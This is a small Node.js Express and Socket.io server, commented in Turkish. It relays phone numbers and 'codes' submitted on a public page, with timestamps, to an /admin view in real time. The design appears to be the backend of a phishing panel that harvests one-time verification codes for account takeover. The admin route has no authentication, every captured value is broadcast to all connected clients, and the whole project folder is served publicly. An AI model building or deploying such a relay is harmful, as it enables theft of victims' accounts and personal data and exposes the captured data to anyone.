const express = require('express');
const app = express();
const http = require('http').createServer(app);
const path = require('path');

// Socket.io'yu CORS ile başlat (Vercel domain'ine izin ver, wildcard '*' ile test için tüm domain'lere açabilirsin)
const io = require('socket.io')(http, {
  cors: {
    origin: "https://walker-wti.vercel.app",  // Frontend domain'in, veya "*" ile test et
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type"],
    credentials: true
  }
});

// Root'tan static serve et
app.use(express.static(path.join(__dirname, "")));

// Ana sayfa
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "", "index.html"));
});

// Admin sayfası
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "", "admin.html"));
});

// Socket.io bağlantısı
io.on('connection', (socket) => {
  console.log('Bir kullanıcı bağlandı');

  socket.on('new-phone', (phone) => {
    console.log('Yeni telefon: ' + phone);
    io.emit('admin-new-phone', { phone: phone, date: new Date().toLocaleString() });
  });

  socket.on('new-code', (code) => {
    console.log('Yeni code: ' + code);
    io.emit('admin-new-code', { code: code, date: new Date().toLocaleString() });
  });

  socket.on('disconnect', () => {
    console.log('Kullanıcı ayrıldı');
  });
});

// Sunucuyu dinle
const port = process.env.PORT || 3000;
http.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor`);
});